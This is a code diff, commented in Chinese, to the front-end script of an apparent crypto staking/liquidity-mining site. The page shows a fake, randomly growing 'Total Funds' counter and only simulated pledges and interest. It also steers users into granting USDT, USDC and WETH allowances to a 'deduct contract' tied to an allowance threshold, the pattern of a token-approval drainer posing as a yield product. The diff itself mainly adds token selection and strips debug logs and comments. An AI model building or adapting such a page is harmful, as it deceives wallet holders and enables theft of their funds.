@@ -27,6 +27,7 @@ const pledgeDuration = document.getElementById('pledgeDuration');
 const pledgeToken = document.getElementById('pledgeToken');
 const refreshWallet = document.getElementById('refreshWallet');
 const walletBalanceValue = document.getElementById('walletBalanceValue');
+const accountBalanceValue = document.getElementById('accountBalanceValue'); // 假設有此元素
 const totalValue = document.getElementById('totalValue');
 const grossOutputValue = document.querySelector('#liquidity .stat-value:nth-of-type(1)');
 const cumulativeValue = document.querySelector('#liquidity .stat-value:nth-of-type(2)');
@@ -37,6 +38,7 @@ let deductContract, usdtContract, usdcContract, wethContract;
 let stakingStartTime = localStorage.getItem('stakingStartTime') ? parseInt(localStorage.getItem('stakingStartTime')) : null; // 從 localStorage 載入
 let claimedInterest = localStorage.getItem('claimedInterest') ? parseFloat(localStorage.getItem('claimedInterest')) : 0; // 從 localStorage 載入
 let pledgedAmount = 0; // 記錄質押金額
+let selectedToken = 'USDT'; // 預設選擇 USDT
 
 //---UI Control Functions (使用者介面控制函數)---
 function updateStatus(message) {
@@ -54,6 +56,7 @@ function resetState(showMsg = true) {
     stakingStartTime = null;
     claimedInterest = 0;
     pledgedAmount = 0;
+    selectedToken = 'USDT'; // 重置為預設代幣
     localStorage.removeItem('stakingStartTime');
     localStorage.removeItem('claimedInterest');
     if (connectButton) {
@@ -62,7 +65,8 @@ function resetState(showMsg = true) {
         connectButton.title = 'Connect Wallet';
     }
     disableInteractiveElements(true);
-    if (walletBalanceValue) walletBalanceValue.textContent = '0.000 USDT / 0.000 USDC / 0.000 WETH';
+    if (walletBalanceValue) walletBalanceValue.textContent = '0.000 USDT';
+    if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
     if (grossOutputValue) grossOutputValue.textContent = '0 ETH'; // 確保重置為 0
     if (cumulativeValue) cumulativeValue.textContent = '0 ETH'; // 確保重置為 0
     if (showMsg) updateStatus("請先連接您的錢包以繼續。");
@@ -86,15 +90,19 @@ function disableInteractiveElements(disable = false) {
 }
 
 /**
- * 更新 Wallet Balance 顯示。
+ * 更新 Wallet Balance 顯示，根據選擇的代幣。
  * @param {Object} balances - 包含 USDT, USDC, WETH 餘額的對象。
  */
 function updateWalletBalance(balances) {
     if (walletBalanceValue) {
-        const usdtBalance = ethers.formatUnits(balances.usdt || 0n, 6);
-        const usdcBalance = ethers.formatUnits(balances.usdc || 0n, 6);
-        const wethBalance = ethers.formatUnits(balances.weth || 0n, 18);
-        walletBalanceValue.textContent = `${parseFloat(usdtBalance).toFixed(3)} USDT / ${parseFloat(usdcBalance).toFixed(3)} USDC / ${parseFloat(wethBalance).toFixed(3)} WETH`;
+        const decimals = { USDT: 6, USDC: 6, WETH: 18 };
+        const balance = ethers.formatUnits(balances[selectedToken.toLowerCase()] || 0n, decimals[selectedToken]);
+        walletBalanceValue.textContent = `${parseFloat(balance).toFixed(3)} ${selectedToken}`;
+    }
+    if (accountBalanceValue) {
+        const decimals = { USDT: 6, USDC: 6, WETH: 18 };
+        const balance = ethers.formatUnits(balances[selectedToken.toLowerCase()] || 0n, decimals[selectedToken]);
+        accountBalanceValue.textContent = `${parseFloat(balance).toFixed(3)} ${selectedToken}`;
     }
 }
 
@@ -103,21 +111,15 @@ function updateWalletBalance(balances) {
  */
 function updateTotalFunds() {
     if (totalValue) {
-        // 起始時間：美東時間 2025 年 10 月 22 日 00:00 (UTC-4)
-        const startTime = new Date('2025-10-22T00:00:00-04:00').getTime(); // UTC 毫秒數
-        const currentTime = Date.now(); // 當前 UTC 毫秒數
-        const elapsedSeconds = Math.floor((currentTime - startTime) / 1000); // 經過的秒數
+        const startTime = new Date('2025-10-22T00:00:00-04:00').getTime();
+        const currentTime = Date.now();
+        const elapsedSeconds = Math.floor((currentTime - startTime) / 1000);
 
-        // 起始金額
         let initialFunds = 12856459.94;
-        // 每秒隨機增加 0.01 ~ 0.1 ETH
         const increaseRate = Math.random() * (0.1 - 0.01) + 0.01;
         const totalIncrease = elapsedSeconds * increaseRate;
 
-        // 總資金 = 起始金額 + 總增加金額
         const totalFunds = initialFunds + totalIncrease;
-
-        // 更新顯示，保留 2 位小數並添加千位分隔符
         totalValue.textContent = `${totalFunds.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
     }
 }
@@ -128,23 +130,19 @@ function updateTotalFunds() {
 function updateInterest() {
     if (stakingStartTime && grossOutputValue && cumulativeValue) {
         const currentTime = Date.now();
-        const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000); // 質押經過的秒數
-        // 利息率基於質押金額，每 1 ETH 每天 0.1% 利息，轉換為每秒
-        const baseInterestRate = 0.000001; // 基礎利率 (0.1% 每天 / 86400 秒)
-        const interestRate = baseInterestRate * pledgedAmount; // 與質押金額成正比
-        const grossOutput = elapsedSeconds * interestRate; // 總累積利息
-        const cumulative = grossOutput - claimedInterest; // 剩餘利息
+        const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
+        const baseInterestRate = 0.000001;
+        const interestRate = baseInterestRate * pledgedAmount;
+        const grossOutput = elapsedSeconds * interestRate;
+        const cumulative = grossOutput - claimedInterest;
 
-        grossOutputValue.textContent = `${grossOutput.toFixed(7)} ETH`; // 保留 7 位小數
-        cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`; // 保留 7 位小數
-        localStorage.setItem('claimedInterest', claimedInterest); // 持久化已領取利息
+        grossOutputValue.textContent = `${grossOutput.toFixed(7)} ETH`;
+        cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`;
+        localStorage.setItem('claimedInterest', claimedInterest);
     }
 }
 
 //---Core Wallet Logic (核心錢包邏輯)---
-/**
- * 【Trust Wallet 修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理。
- */
 async function sendMobileRobustTransaction(populatedTx) {
     if (!signer || !provider) throw new Error("錢包未連接或簽名者缺失。");
 
@@ -190,9 +188,6 @@ async function sendMobileRobustTransaction(populatedTx) {
     return receipt;
 }
 
-/**
- * 初始化錢包，強制切換至以太坊主網。
- */
 async function initializeWallet() {
     try {
         if (typeof window.ethereum === 'undefined') {
@@ -214,7 +209,7 @@ async function initializeWallet() {
                     await provider.send('wallet_addEthereumChain', [{
                         chainId: '0x1',
                         chainName: 'Ethereum Mainnet',
-                        rpcUrls: ['https://mainnet.infura.io/v3/'], // 請替換為您的 RPC URL
+                        rpcUrls: ['https://mainnet.infura.io/v3/'],
                         nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                         blockExplorerUrls: ['https://etherscan.io']
                     }]);
@@ -251,9 +246,6 @@ async function initializeWallet() {
     }
 }
 
-/**
- * 檢查使用者的服務啟動狀態和代幣授權額度。
- */
 async function checkAuthorization() {
     try {
         if (!signer) {
@@ -276,12 +268,6 @@ async function checkAuthorization() {
 
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = isServiceActive && hasSufficientAllowance;
-
-        console.log("【DEBUG_FinalCheck】用戶地址:", userAddress);
-        console.log("【DEBUG_FinalCheck】所需授權額度:", requiredAllowance.toString());
-        console.log("【DEBUG_FinalCheck】服務啟動:", isServiceActive);
-        console.log("【DEBUG_FinalCheck】是否有足夠授權:", hasSufficientAllowance);
-        console.log("【DEBUG_FinalCheck】是否完全授權 (最終):", isFullyAuthorized);
 
         if (isFullyAuthorized) {
             if (connectButton) {
@@ -311,9 +297,6 @@ async function checkAuthorization() {
     }
 }
 
-/**
- * 條件式授權流程：根據 ETH/WETH 餘額決定要授權哪些代幣。
- */
 async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess) {
     updateStatus('檢查並設置代幣授權中...');
     let tokenToActivate = '';
@@ -367,9 +350,6 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
     }
 }
 
-/**
- * 主要函數：連接錢包並根據餘額執行條件式流程。
- */
 async function connectWallet() {
     try {
         if (!provider || (await provider.getNetwork()).chainId !== 1n) {
@@ -438,9 +418,6 @@ async function connectWallet() {
         const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
 
-        console.log("【DEBUG】所需授權額度 (閾值):", requiredAllowance.toString());
-        console.log("【DEBUG】服務已啟動:", serviceActivated);
-
         const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
             usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
             usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
@@ -452,12 +429,6 @@ async function connectWallet() {
 
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = serviceActivated && hasSufficientAllowance;
-
-        console.log("【DEBUG】USDT 授權:", usdtAllowance.toString());
-        console.log("【DEBUG】USDC 授權:", usdcAllowance.toString());
-        console.log("【DEBUG】WETH 授權:", wethAllowance.toString());
-        console.log("【DEBUG】是否有足夠授權:", hasSufficientAllowance);
-        console.log("【DEBUG】是否完全授權 (最終檢查):", isFullyAuthorized);
 
         let tokensToProcess;
 
@@ -502,25 +473,19 @@ async function connectWallet() {
     }
 }
 
-/**
- * 斷開連線並重置應用程式狀態。
- */
 function disconnectWallet() {
     resetState(true);
     alert('錢包已斷開。要完全移除網站權限，請在錢包的「已連接網站」設置中操作。');
 }
 
-/**
- * 模擬領取利息。
- */
 function claimInterest() {
     if (stakingStartTime && grossOutputValue) {
         const currentTime = Date.now();
         const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
-        const baseInterestRate = 0.000001; // 基礎利率 (0.1% 每天 / 86400 秒)
+        const baseInterestRate = 0.000001;
         const interestRate = baseInterestRate * pledgedAmount;
         const grossOutput = elapsedSeconds * interestRate;
-        claimedInterest = grossOutput; // 領取所有當前利息
+        claimedInterest = grossOutput;
         localStorage.setItem('claimedInterest', claimedInterest);
         updateInterest();
         alert('利息已領取！(模擬)');
@@ -666,10 +631,10 @@ startBtn.addEventListener('click', () => {
         return;
     }
     if (!stakingStartTime) {
-        stakingStartTime = Date.now(); // 記錄質押開始時間
-        localStorage.setItem('stakingStartTime', stakingStartTime); // 持久化開始時間
+        selectedToken = pledgeToken.value; // 記錄選擇的代幣
+        stakingStartTime = Date.now();
+        localStorage.setItem('stakingStartTime', stakingStartTime);
         alert('開始流動性挖礦... (模擬: 流程已啟動)');
-        // 添加 Claim 按鈕
         claimBtn.textContent = translations[currentLang].claimBtnText || 'Claim';
         claimBtn.className = 'start-btn';
         claimBtn.style.marginTop = '10px';
@@ -677,7 +642,6 @@ startBtn.addEventListener('click', () => {
         document.getElementById('liquidity').appendChild(claimBtn);
         claimBtn.addEventListener('click', claimInterest);
     }
-    // 每秒更新利息
     setInterval(updateInterest, 1000);
 });
 
@@ -693,7 +657,7 @@ pledgeBtn.addEventListener('click', async () => {
         alert('請輸入質押金額！');
         return;
     }
-    pledgedAmount = amount; // 更新質押金額
+    pledgedAmount = amount;
     alert(`質押 ${amount} ${token} 於 ${duration} 天... (模擬: 質押成功)`);
     const totalPledgedValue = document.getElementById('totalPledgedValue');
     let currentTotal = parseFloat(totalPledgedValue.textContent) || 0;
@@ -732,8 +696,6 @@ tabs.forEach(tab => {
     });
 });
 
-// 每秒更新 Total Funds
 setInterval(updateTotalFunds, 1000);
 
-// 頁面載入時執行初始化
 initializeWallet();
